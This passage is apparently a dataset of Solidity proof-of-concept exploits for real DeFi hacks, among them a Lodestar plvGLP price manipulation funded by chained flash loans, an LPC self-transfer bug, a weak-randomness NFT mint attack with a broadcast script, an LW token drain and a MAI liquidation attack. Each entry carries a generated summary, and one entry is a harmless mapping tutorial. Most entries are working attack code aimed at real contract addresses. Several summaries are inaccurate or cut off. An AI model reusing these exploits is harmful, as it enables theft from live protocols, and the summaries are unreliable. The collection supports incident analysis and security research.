        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/SolidityFinance/status/1601684150456438784\n// https://blog.lodestarfinance.io/post-mortem-summary-13f5fe0bb336\n// @TX\n// https://arbiscan.io/tx/0xc523c6307b025ebd9aef155ba792d1ba18d5d83f97c7a846f267d3d9a3004e8c\n\ninterface uniswapV3Flash{\n    function flash(\n        address recipient,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external;\n}\n\ninterface GMXRouter{\n    function swapETHToTokens(address[] memory _path, uint256 _minOut, address _receiver) external payable;\n    function swap(address[] memory _path, uint256 _amountIn, uint256 _minOut, address _receiver) external;\n}\n\ninterface GMXReward{\n    function mintAndStakeGlpETH(uint256 _minUsdg, uint256 _minGlp) external payable returns(uint256); \n    function mintAndStakeGlp(address _token, uint256 _amount, uint256 _minUsdg, uint256 _minGlp) external returns(uint256);\n}\n\ninterface SwapFlashLoan{\n    function flashLoan(\n        address receiver,\n        address token,\n        uint256 amount,\n        bytes memory params\n    ) external;\n}\n\ninterface GlpDepositor{\n    function donate(uint256 _amount) external;\n    function redeem(uint256 amount) external;\n}\n\ncontract ContractTest is Test{\n    IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);\n    IERC20 DAI = IERC20(0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1);\n    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);\n    IERC20 USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);\n    IERC20 FRAX = IERC20(0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F);\n    IERC20 sGLP = IERC20(0x2F546AD4eDD93B956C8999Be404cdCAFde3E89AE);\n    IERC20 MIM = IERC20(0xFEa7a6a0B346362BF88A9e4A88416B77a57D6c2A);\n    IERC20 WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);\n    IERC20 PlvGlpToken = IERC20(0x5326E71Ff593Ecc2CF7AcaE5Fe57582D6e74CFF1);\n    IAaveFlashloan AaveFlash = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);\n    IAaveFlashloan Radiant = IAaveFlashloan(0x2032b9A8e9F7e76768CA9271003d3e43E1616B1F);\n    uniswapV3Flash UniV3Flash1 = uniswapV3Flash(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443);\n    uniswapV3Flash UniV3Flash2 = uniswapV3Flash(0x50450351517117Cb58189edBa6bbaD6284D45902);\n    uniswapV3Flash UniV3Flash3 = uniswapV3Flash(0x13398E27a21Be1218b6900cbEDF677571df42A48);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x905dfCD5649217c42684f23958568e533C711Aa3);\n    GMXRouter Router = GMXRouter(0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064);\n    GMXReward Reward = GMXReward(0xA906F338CB21815cBc4Bc87ace9e68c87eF8d8F1);\n    IUnitroller unitroller = IUnitroller(0x8f2354F9464514eFDAe441314b8325E97Bf96cdc);\n    ICErc20Delegate IUSDC = ICErc20Delegate(0x5E3F2AbaECB51A182f05b4b7c0f7a5da1942De90);\n    ICErc20Delegate lplvGLP = ICErc20Delegate(0xCC25daC54A1a62061b596fD3Baf7D454f34c56fF);\n    ICErc20Delegate IETH = ICErc20Delegate(0xb4d58C1F5870eFA4B05519A72851227F05743273);\n    ICErc20Delegate IMIM = ICErc20Delegate(0x46178d84339A04f140934EE830cDAFDAcD29Fba9);\n    ICErc20Delegate IUSDT = ICErc20Delegate(0xeB156f76Ef69be485c18C297DeE5c45390345187);\n    ICErc20Delegate IFRAX = ICErc20Delegate(0x5FfA22244D8273d899B6C20CEC12A88a7Cd9E460);\n    ICErc20Delegate IDAI = ICErc20Delegate(0x7a668F56AffD511FFc83C31666850eAe9FD5BCC8);\n    ICErc20Delegate IWBTC = ICErc20Delegate(0xD2835B08795adfEfa0c2009B294ae84B08C6a67e);\n    SwapFlashLoan swapFlashLoan = SwapFlashLoan(0x401AFbc31ad2A3Bc0eD8960d63eFcDEA749b4849);\n    GlpDepositor depositor = GlpDepositor(0x13F0D29b5B83654A200E4540066713d50547606E);\n    address GlpManager = 0x321F653eED006AD1C29D174e17d96351BDe22649;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"arbitrum\", 45121903);\n        cheats.label(address(USDC), \"USDC\");\n        cheats.label(address(DAI), \"DAI\");\n        cheats.label(address(WETH), \"WETH\");\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(FRAX), \"FRAX\");\n        cheats.label(address(sGLP), \"sGLP\");\n        cheats.label(address(MIM), \"MIM\");\n        cheats.label(address(WBTC), \"WBTC\");\n        cheats.label(address(PlvGlpToken), \"PlvGlpToken\");\n        cheats.label(address(AaveFlash), \"AaveFlash\");\n        cheats.label(address(Radiant), \"Radiant\");\n        cheats.label(address(UniV3Flash1), \"UniV3Flash1\");\n        cheats.label(address(UniV3Flash2), \"UniV3Flash2\");\n        cheats.label(address(UniV3Flash3), \"UniV3Flash3\");\n        cheats.label(address(Pair), \"Pair\");\n        cheats.label(address(Router), \"Router\");\n        cheats.label(address(Reward), \"Reward\");\n        cheats.label(address(unitroller), \"unitroller\");\n        cheats.label(address(IUSDC), \"IUSDC\");\n        cheats.label(address(lplvGLP), \"lplvGLP\");\n        cheats.label(address(IETH), \"IETH\");\n        cheats.label(address(IMIM), \"IMIM\");\n        cheats.label(address(IUSDT), \"IUSDT\");\n        cheats.label(address(IFRAX), \"IFRAX\");\n        cheats.label(address(IDAI), \"IDAI\");\n        cheats.label(address(IWBTC), \"IWBTC\");\n        cheats.label(address(swapFlashLoan), \"swapFlashLoan\");\n        cheats.label(address(depositor), \"depositor\");\n        cheats.label(GlpManager, \"GlpManager\");\n    }\n\n    function testExploit() external{\n        address[] memory assets = new address[](3);\n        assets[0] = address(USDC);\n        assets[1] = address(WETH);\n        assets[2] = address(DAI);\n        uint256[] memory amounts = new uint256[](3);\n        amounts[0] = 17_290_000 * 1e6;\n        amounts[1] = 9_500 * 1e18;\n        amounts[2] = 406_316 * 1e18;\n        uint256[] memory modes = new uint[](3);\n        modes[0] = 0;\n        modes[1] = 0;\n        modes[2] = 0;\n        AaveFlash.flashLoan(address(this), assets, amounts, modes, address(0), \"\", 0);\n\n        emit log_named_decimal_uint(\"Attacker PlvGlpToken balance after exploit\", PlvGlpToken.balanceOf(address(this)), PlvGlpToken.decimals());\n        console.log(\"Attacker swap all PlvGlpToken to about 4500 ETH\");\n        emit log_named_decimal_uint(\"Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals());\n        emit log_named_decimal_uint(\"Attacker WETH balance after exploit\", WETH.balanceOf(address(this)), WETH.decimals());\n        emit log_named_decimal_uint(\"Attacker MIM balance after exploit\", MIM.balanceOf(address(this)), MIM.decimals());\n        emit log_named_decimal_uint(\"Attacker FRAX balance after exploit\", FRAX.balanceOf(address(this)), FRAX.decimals());\n        emit log_named_decimal_uint(\"Attacker DAI balance after exploit\", DAI.balanceOf(address(this)), DAI.decimals());\n        emit log_named_decimal_uint(\"Attacker WBTC balance after exploit\", WBTC.balanceOf(address(this)), WBTC.decimals());\n    }\n\n    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external payable returns (bool){\n        if(msg.sender == address(AaveFlash)){\n            USDC.approve(address(AaveFlash), type(uint).max);\n            WETH.approve(address(AaveFlash), type(uint).max);\n            DAI.approve(address(AaveFlash), type(uint).max);\n            address[] memory assets = new address[](1);\n            assets[0] = address(USDC);\n            uint256[] memory amounts = new uint256[](1);\n            amounts[0] = 14_435_000 * 1e6;\n            uint256[] memory modes = new uint[](1);\n            modes[0] = 0;\n            Radiant.flashLoan(address(this), assets, amounts, modes, address(0), new bytes(1), 0);\n            return true;\n        }\n        else if(msg.sender == address(Radiant)){\n            USDC.approve(address(Radiant), type(uint).max);\n            UniV3Flash1.flash(address(this), 5_460 * 1e18, 7_170_000 * 1e6, new bytes(1));\n            return true;\n        }\n    }\n\n    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external{\n        if(msg.sender == address(UniV3Flash1)){\n            UniV3Flash2.flash(address(this), 0, 2_200_000 * 1e6, new bytes(1));\n            USDC.transfer(address(UniV3Flash1), 7_173_631 * 1e6);\n            USDC.approve(address(Router), 19_012_632 * 1e6);\n            address[] memory path = new address[](2);\n            path[0] = address(USDC);\n            path[1] = address(WETH);\n            Router.swap(path, 19_012_632 * 1e6, 8000 * 1e18, address(this));\n            WETH.transfer(address(UniV3Flash1), 5_463 * 1e18);\n        }\n        else if(msg.sender == address(UniV3Flash2)){\n            Pair.swap(0, 10_000_000 * 1e6, address(this), new bytes(1));\n            USDC.transfer(address(UniV3Flash2), 2_201_111 * 1e6);\n        }\n        else if(msg.sender == address(UniV3Flash3)){\n            swapFlashLoan.flashLoan(address(this), address(FRAX), 361_037 * 1e18, new bytes(1));\n            USDT.transfer(address(UniV3Flash3), 397_256 * 1e6);\n            USDC.transfer(address(UniV3Flash3), 1_610_460 * 1e6);\n        }\n    }\n\n    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) payable external{\n        WETH.withdraw(WETH.balanceOf(address(this)));\n        address[] memory path = new address[](2);\n        path[0] = address(WETH);\n        path[1] = address(USDC);\n        Router.swapETHToTokens{value: 14960 ether}(path, 18_890_000 * 1e6, address(this)); // 14,960 WETH for 19,001,512 USDC\n        USDC.approve(address(IUSDC), USDC.balanceOf(address(this)));\n        IUSDC.mint(USDC.balanceOf(address(this))); // 70M USDC\n        address[] memory cTokens = new address[](1);\n        cTokens[0] = address(IUSDC);\n        unitroller.enterMarkets(cTokens);\n        uint PlvGlpTokenAmount = PlvGlpToken.balanceOf(address(lplvGLP));\n        PlvGlpToken.approve(address(lplvGLP), type(uint).max);\n        for(uint i = 0; i < 16; i++){\n            lplvGLP.borrow(PlvGlpTokenAmount);\n            lplvGLP.mint(PlvGlpTokenAmount);\n        }\n        lplvGLP.borrow(PlvGlpTokenAmount);\n        deal(address(lplvGLP), address(0), 3_051_070_161 * 1e8); // the exploiter' balance\n        cheats.startPrank(address(0));\n        lplvGLP.transfer(address(this), lplvGLP.balanceOf(address(this)));\n        cheats.stopPrank();\n        UniV3Flash3.flash(address(this), 397_054 * 1e6, 1_609_646 * 1e6, new bytes(1));\n        USDC.transfer(address(Pair), 10_030_500 * 1e6);\n    }\n\n    function executeOperation(\n        address pool,\n        address token,\n        uint256 amount,\n        uint256 fee,\n        bytes calldata params\n    ) external payable{\n        uint ETHglpAmount = Reward.mintAndStakeGlpETH{value: 1580 ether}(1_836_000 * 1e18, 2_156_500 * 1e18);\n        FRAX.approve(GlpManager, FRAX.balanceOf(address(this)));\n        uint FRAXglpAmount = Reward.mintAndStakeGlp(address(FRAX), FRAX.balanceOf(address(this)), 300_000 * 1e18, 361_000 * 1e18);\n        USDC.approve(GlpManager, USDC.balanceOf(address(this)));\n        uint USDCglpAmount = Reward.mintAndStakeGlp(address(USDC), USDC.balanceOf(address(this)), 1_500_000 * 1e18, 1_757_500 * 1e18);\n        DAI.approve(GlpManager, DAI.balanceOf(address(this)));\n        uint DAIglpAmount = Reward.mintAndStakeGlp(address(DAI), DAI.balanceOf(address(this)), 390_000 * 1e18, 399_000 * 1e18);\n        USDT.approve(GlpManager, USDT.balanceOf(address(this)));\n        uint USDTglpAmount = Reward.mintAndStakeGlp(address(USDT), USDT.balanceOf(address(this)), 350_000 * 1e18, 427_500 * 1e18);\n\n        uint glpAmount = ETHglpAmount + FRAXglpAmount + USDCglpAmount + DAIglpAmount + USDTglpAmount;\n        sGLP.approve(address(depositor), glpAmount);\n        depositor.donate(glpAmount); // plvGLP price manipulation\n\n        address[] memory cTokens = new address[](1);\n        cTokens[0] = address(lplvGLP);\n        unitroller.enterMarkets(cTokens);\n        borrowAll();\n        address(WETH).call{value: 125 ether}(\"\");\n        FRAX.transfer(address(swapFlashLoan), 361_327 * 1e18);\n    }\n\n    function borrowAll() internal{\n        IUSDC.borrow(USDC.balanceOf(address(IUSDC)));\n        IETH.borrow(address(IETH).balance);\n        IMIM.borrow(MIM.balanceOf(address(IMIM)));\n        IUSDT.borrow(USDT.balanceOf(address(IUSDT)));\n        IFRAX.borrow(FRAX.balanceOf(address(IFRAX)));\n        IDAI.borrow(DAI.balanceOf(address(IDAI)));\n        IWBTC.borrow(WBTC.balanceOf(address(IWBTC)));\n    }\n\n    receive() payable external{}\n\n}",
        "summary": "This code defines a Solidity contract that exploits a vulnerability in the Aave flash loan system on the Arbitrum blockchain. The `testExploit()` function triggers a flash loan from Aave, proceeds to manipulate prices of plvGLP tokens to eventually borrow a large amount of various tokens from the Aave system. The attack also involves a series",
        "id": "4fb4266a-1a67-43fa-9623-ae801edd874b"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo - Total Lost : 178 BNB (~ 45,715 US$)\n// Attacker : 0xd9936EA91a461aA4B727a7e3661bcD6cD257481c\n// AttackContract : 0xcfb7909b7eb27b71fdc482a2883049351a1749d7 \n// Txhash : 0x0e970ed84424d8ea51f6460ce6105ab68441d4450a80bc8d749fdf01e504ed8c\n\n// @Info\n// LPC Contract : https://bscscan.com/address/0x1e813fa05739bf145c1f182cb950da7af046778d#code#L1240\n\n// @NewsTrack\n// PANews : https://www.panewslab.com/zh_hk/articledetails/uwv4sma2.html\n// Beosin Alert : https://twitter.com/BeosinAlert/status/1551535854681718784\n\n\nCheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\naddress constant attacker = 0xd9936EA91a461aA4B727a7e3661bcD6cD257481c;\naddress constant LPC = 0x1E813fA05739Bf145c1F182CB950dA7af046778d;\naddress constant pancakePair = 0x2ecD8Ce228D534D8740617673F31b7541f6A0099;\n\n\ncontract Exploit is Test {\n    function setUp() public {\n        cheat.createSelectFork(\"bsc\", 19852596);\n        cheat.label(LPC, \"LPC\");\n        cheat.label(pancakePair, \"PancakeSwap LPC/USDT\");\n    }\n\n    function testExploit() public {\n        emit log_named_decimal_uint(\"LPC balance\",  IERC20(LPC).balanceOf(address(this)), 18);\n\n        console.log(\"Get LPC reserve in PancakeSwap...\");\n        (uint256 LPC_reserve, , ) = IPancakePair(pancakePair).getReserves();\n        emit log_named_decimal_uint(\"\\tLPC Reserve\", LPC_reserve, 18);\n\n        console.log(\"Flashloan all the LPC reserve...\");\n        uint256 borrowAmount = LPC_reserve - 1; // -1 to avoid trigger INSUFFICIENT_LIQUIDITY\n        bytes memory data = unicode'\u26a1\ud83d\udcb0';\n        IPancakePair(pancakePair).swap(borrowAmount, 0, address(this), data);\n        console.log(\"Flashloan ended\");\n\n        emit log_named_decimal_uint(\"LPC balance\",  IERC20(LPC).balanceOf(address(this)), 18);\n        console.log(\"\\nNext transaction will swap LPC to USDT\");\n    }\n\n    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        console.log(\"\\tSuccessfully borrow LPC from PancakeSwap\");\n        uint256 LPC_balance = IERC20(LPC).balanceOf(address(this));\n        emit log_named_decimal_uint(\"\\tFlashloaned LPC\", LPC_balance, 18);\n\n        console.log(\"\\tExploit...\");\n        for(uint8 i; i<10; ++i){\n            console.log(\"\\tSelf transfer... Loop %s\", i);\n            IERC20(LPC).transfer(address(this), LPC_balance);\n        }\n        \n        console.log(\"\\tPayback flashloan...\");\n        uint256 paybackAmount = amount0 / 90 / 100 * 10000; // paybackAmount * 90% = amount0  --> fee = 10%\n        IERC20(LPC).transfer(pancakePair, paybackAmount);\n    }\n}",
        "summary": "This is a Solidity smart contract that exploits a vulnerability in the LPC contract. It imports a library, sets constants for cheat codes, the attacker's address, and addresses for the LPC contract and PancakeSwap liquidity pool for LPC/USDT. \n\nThe `Exploit` contract defines a `setUp` function that sets up some labels and a `testExploit` function that performs a flash loan of all LPC in the PancakeSwap liquidity pool, transfers LPC tokens to itself, and then pays back the flash loan. The `pancakeCall` function is called by PancakeSwap when sending back the flash loan, and this function transfers more LPC tokens to itself, pays back the flash loan with a fee, and ends the transaction by swapping LPC to USDT.\n\nOverall, this contract is used to exploit a vulnerability and steal funds from the LPC contract on the Binance Smart Chain.",
        "id": "8235865e-d55f-456f-b112-07f5641bc875"
    },
    {
        "code": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity ^0.8.13;\n\n\nimport \"forge-std/Test.sol\";\n\n/*\n    Attacker: 0x3392c91403f09ad3b7e7243dbd4441436c7f443c\n    Attack tx: https://etherscan.io/tx/0x804ff3801542bff435a5d733f4d8a93a535d73d0de0f843fd979756a7eab26af\n    poc refers to: https://github.com/0xNezha/luckyHack\n*/\n\ninterface NFT {\n    function balanceOf(address _owner) external view returns (uint balance);\n}\n\ncontract luckyHack is Test {\n\n   event Log(string);\n\n   address owner      = address(this);\n   address nftAddress = 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967;   \n   \n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 15403430); // fork mainnet block number 15403430\n        vm.deal(address(this), 3 ether);\n        vm.deal(address(nftAddress), 5 ether);\n    }\n\n   function getRandom() public view returns(uint){\n        if(uint256(keccak256(abi.encodePacked(block.difficulty,block.timestamp))) % 2 == 0) {\n            return 0;\n        }else{\n            return 1;\n        }\n   }\n\n\n   function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {\n    return this.onERC721Received.selector;\n   }\n\n   function testExploit() public { \n        vm.warp(1661351167);\n        console.log(\"getRandom\",getRandom());\n\n        uint amount = 10;\n\n         if(uint256(keccak256(abi.encodePacked(block.difficulty,block.timestamp))) % 2 == 0) {\n           revert(\"Not lucky\");\n         }\n        bytes memory data = abi.encodeWithSignature(\"publicMint()\");\n\n        for(uint i=0; i<amount ; ++i){\n \n           (bool status,) = address(nftAddress).call{value:0.01 ether}(data);          \n            if( !status ){\n            revert(\"error\");\n         }else{\n            emit Log(\"success\");\n         }\n\n        } \n\n        console.log(\"NFT we got:\",NFT(nftAddress).balanceOf(address(this)));\n   }\n\n   function getBalance() external view returns(uint256) {\n      return address(this).balance;\n    }\n\n   receive() external payable {}\n}",
        "summary": "This code is a Solidity smart contract that aims to exploit vulnerabilities of a specific smart contract called \"luckyHack\". The contract imports a standard library called \"Test.sol\" and defines an owner and an NFT contract address. It provides a function called \"setUp()\" that creates a new fork of the Ethereum mainnet and deals ether to the contract and the NFT contract. There is also a function called \"getRandom()\" that returns a random number based on the block difficulty and timestamp. The contract implements a function called \"onERC721Received()\" which returns the function selector when a new NFT is received. It defines another function called \"testExploit()\" which uses a random number to determine if the contract should revert or proceed with minting a certain number of NFTs. At the end, there is a function called \"getBalance()\" which returns the balance of the contract. Finally, the contract defines a receive function to accept incoming ether transactions.",
        "id": "b3b1bbd2-7a27-4280-b5ec-cacc95a9cef2"
    },
    {
        "code": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity ^0.8.13;\n\n\nimport \"forge-std/Script.sol\";\n\n/*\n step1: fork mainnet block in locol anvil --fork-url https://rpc.ankr.com/eth --fork-block-number 15403398\n step2: launch exploit\n forge script script/luckyHack.sol:luckyHack --fork-url http://127.0.0.1:8545 --private-key $PRIVATE_KEY --broadcast\n\n poc refers to: https://github.com/0xNezha/luckyHack\n*/\ncontract luckyHack is Script {\n\n   event Log(string);\n\n   address owner      = address(this);\n   address nftAddress = 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967;   \n   \n    function setUp() public {\n        vm.deal(address(this), 3 ether);\n        vm.deal(address(nftAddress), 5 ether);\n    }\n\n   function getRandom() public view returns(uint){\n        if(uint256(keccak256(abi.encodePacked(block.difficulty,block.timestamp))) % 2 == 0) {\n            return 0;\n        }else{\n            return 1;\n        }\n   }\n\n\n   function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {\n    return this.onERC721Received.selector;\n   }\n\n   function hack(uint256 amount) public { \n        console.log(\"Contract balance\",address(this).balance);\n        console.log(\"getRandom\",getRandom());\n\n        if(uint256(keccak256(abi.encodePacked(block.difficulty,block.timestamp))) % 2 == 0) {\n           revert(\"Not lucky\");\n         }\n\n        bytes memory data = abi.encodeWithSignature(\"publicMint()\");\n        for(uint i=0; i<amount ; ++i){\n\n            if (address(nftAddress).balance <= 0.01 ether) {\n                emit Log(\"rug away!\");\n                \n                return;\n            }\n\n           (bool status,) = address(nftAddress).call{value:0.01 ether}(data);          \n            if( !status ){\n            revert(\"error\");\n         }else{\n            emit Log(\"success\");\n         }\n        } \n   }\n\n\n    function run() public {\n        vm.startBroadcast();\n\t\t\n        hack(50);\n        \n        vm.stopBroadcast();\n    }\n\n   function getBalance() external view returns(uint256) {\n      return address(this).balance;\n    }\n\n   receive() external payable {}\n}",
        "summary": "This is a smart contract written in Solidity. It imports the \"Script\" library from Forge and defines a contract called \"luckyHack\". \n\nThe contract has a function called \"hack\" which is meant to exploit a vulnerability in the smart contract deployed at the address specified in the \"nftAddress\" variable. The hack uses a loop to repeatedly call the \"publicMint\" function of the target smart contract and transfer 0.01 ether to the target contract for each call. \n\nThe contract also has a function called \"getRandom\" which returns a pseudo-random number based on the block difficulty and timestamp. There are some other functions in the contract that are used to configure and run the exploit. \n\nAt the end of the contract, there is a \"receive\" function which allows the contract to receive ether, and a \"getBalance\" function which returns the contract's balance in ether.",
        "id": "b2825222-5bbb-43e1-9247-196b2d3fdb0a"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo - Total Lost : ~50K US$\n// Attacker : https://bscscan.com/address/0x4404de29913e0fd055190e680771a016777973e5\n// Attack Contract : https://bscscan.com/address/0xa4fbc2c95ac4240277313bf3f810c54309dfcd6c\n// Vulnerable Contract : https://bscscan.com/address/0x7b8c378df8650373d82ceb1085a18fe34031784f\n// Attack Tx : https://bscscan.com/tx/0xb846f3aeb9b3027fe138b23bbf41901c155bd6d4b24f08d6b83bd37a975e4e4a\n// Attack Tx : https://bscscan.com/tx/0x96b34dc3a98cd4055a984132d7f3f4cc5a16b2525113b8ef83c55ac0ba2b3713\n\n// @Info\n// Vulnerable Contract Code : https://bscscan.com/address/0x7b8c378df8650373d82ceb1085a18fe34031784f#code\n\n// @Analysis\n// Post-mortem : https://www.google.com/\n// Twitter Guy : https://twitter.com/PeckShieldAlert/status/1656850634312925184\n// Twitter Guy : https://twitter.com/hexagate_/status/1657051084131639296\n// Hacking God : https://www.google.com/\n\ninterface ILW is IERC20 {\n    function getTokenPrice() external view returns (uint256);\n    function thanPrice() external view returns (uint256);\n}\n\ncontract ContractTest is Test {\n    ILW LW = ILW(payable(0x7B8C378df8650373d82CeB1085a18FE34031784F));\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);\n    Uni_Pair_V2 LP = Uni_Pair_V2(0x6D2D124acFe01c2D2aDb438E37561a0269C6eaBB);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    address marketAddr = 0xae2f168900D5bb38171B01c2323069E5FD6b57B9;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 28_133_285);\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(LW), \"LW\");\n        cheats.label(address(LP), \"LP\");\n        cheats.label(address(Pair), \"Pair\");\n        cheats.label(address(Router), \"Router\");\n        cheats.label(address(marketAddr), \"marketAddr\");\n    }\n\n    function testExploit() public {\n        Pair.swap(1_000_000 * 1e18, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), USDT.decimals()\n        );\n    }\n\n    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        USDTToLW();\n        while (USDT.balanceOf(marketAddr) > 3000 * 1e18) {\n            LW.thanPrice();\n            uint256 transferAmount = 2510e18 * 1e18 / LW.getTokenPrice();\n            LW.transfer(address(LP), transferAmount);\n            LW.thanPrice();\n            LP.skim(address(this));\n            payable(address(LW)).call{value: 1}(\"\"); // Trigger the swap 3000e18 USDT to LW in the receive function\n        }\n        LWToUSDT();\n        USDT.transfer(address(Pair), 1_002_507 * 1e18);\n    }\n\n    function USDTToLW() internal {\n        USDT.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(LW);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            USDT.balanceOf(address(this)), 0, path, address(this), block.timestamp\n        );\n    }\n\n    function LWToUSDT() internal {\n        LW.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(LW);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            LW.balanceOf(address(this)), 0, path, address(this), block.timestamp\n        );\n    }\n}\n",
        "summary": "This Solidity code defines a contract called `ContractTest`, which interacts with other contracts and tokens. It imports other Solidity code files and interfaces required for the contract's functionality. It initializes a cheat code contract and contracts for various tokens such as USDT and LW. The `setUp()` function is called once before testing the exploit. The `testExploit()` function performs an exploit by calling the `swap()` function of a token contract and emits a log after it is done. The `pancakeCall()` function is called when tokens are received and performs multiple transfers and swaps between tokens.",
        "id": "74bc1ae7-34e0-42db-9ce7-6bf702c023ad"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\ncontract Mapping {\n    mapping(uint => address) public idToAddress; // id\u6620\u5c04\u5230\u5730\u5740\n    mapping(address => address) public swapPair; // \u5e01\u5bf9\u7684\u6620\u5c04\uff0c\u5730\u5740\u5230\u5730\u5740\n    \n    // \u89c4\u52191. _KeyType\u4e0d\u80fd\u662f\u81ea\u5b9a\u4e49\u7684 \u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50\u4f1a\u62a5\u9519\n    // \u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a\u7ed3\u6784\u4f53 Struct\n    // struct Student{\n    //    uint256 id;\n    //    uint256 score; \n    //}\n    // mapping(Struct => uint) public testVar;\n\n    function writeMap (uint _Key, address _Value) public{\n        idToAddress[_Key] = _Value;\n    }\n}\n",
        "summary": "This is a Solidity smart contract that contains two mapping variables, `idToAddress` and `swapPair`. The first mapping maps a uint value to an Ethereum address and the second mapping maps one Ethereum address to another. The contract also includes a function called `writeMap` that allows the caller to add an entry to the `idToAddress` mapping. The code additionally demonstrates an example of a commented-out struct definition with a note explaining that custom types are not allowed as keys in mappings according to rule 1.",
        "id": "9b1a7a20-4f64-48bb-a5a4-9eed958b1c9b"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.17;\n\nimport \"forge-std/Test.sol\";\n\n// Total Lost: $180k \n// Attacker: 0x4206d62305d2815494dcdb759c4e32fca1d181a0\n// Attack Contract: 0xEb4c67E5BE040068FA477a539341d6aeF081E4Eb\n// Vulnerable Contract: 0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943 \n// Attack Tx: https://phalcon.blocksec.com/tx/polygon/0xb8efe839da0c89daa763f39f30577dc21937ae351c6f99336a0017e63d387558 \n//            https://polygonscan.com/tx/0xb8efe839da0c89daa763f39f30577dc21937ae351c6f99336a0017e63d387558\n\n// @Analyses\n// https://quillaudits.medium.com/decoding-220k-read-only-reentrancy-exploit-quillaudits-30871d728ad5\n// https://ambergroup.medium.com/mai-finances-oracle-manipulation-vulnerability-explained-55e4b5cc2b82\n// https://twitter.com/statemindio/status/1585341766588190720\n// https://twitter.com/BeosinAlert/status/1584551399941365763\n\ncontract Liquidator {\n    CErc20Interface private constant CErc20_mmooCurvestMATIC_MATIC_4 = CErc20Interface(0x570Bc2b7Ad1399237185A27e66AEA9CfFF5F3dB8);\n    ICErc20Delegate private constant CErc20Delegate_mMAI_4           = ICErc20Delegate(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);\n    BeefyVault      private constant beefyVault                      = BeefyVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85);  \n    IERC20          private constant miMATIC                         = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1); \n    \n    // https://www.youtube.com/watch?v=w-oVV0Ie3Fw&t=188s&ab_channel=SmartContractProgrammer\n    function liquidate(address main) external { \n        // use 70_420 miMATIC as repayAmount for liquidation\n        miMATIC.approve(address(CErc20Delegate_mMAI_4), type(uint256).max);\n        require(CErc20Delegate_mMAI_4.liquidateBorrow(main, 70_420 ether, address(CErc20_mmooCurvestMATIC_MATIC_4)) == 0, \"liquidate failed\");   \n\n        // redeem beefyVault token (mooCurvestMATIC-MATIC)    \n        CErc20_mmooCurvestMATIC_MATIC_4.redeem(CErc20_mmooCurvestMATIC_MATIC_4.balanceOf(address(this)));  \n\n        // transfer all tokens to main attack contract\n        beefyVault.transfer(main, beefyVault.balanceOf(address(this)));\n        miMATIC.transfer(main, miMATIC.balanceOf(address(this)));  \n    }\n}\n\ncontract MarketExploitTest is Test {\n    WETH9  private constant  WMATIC = 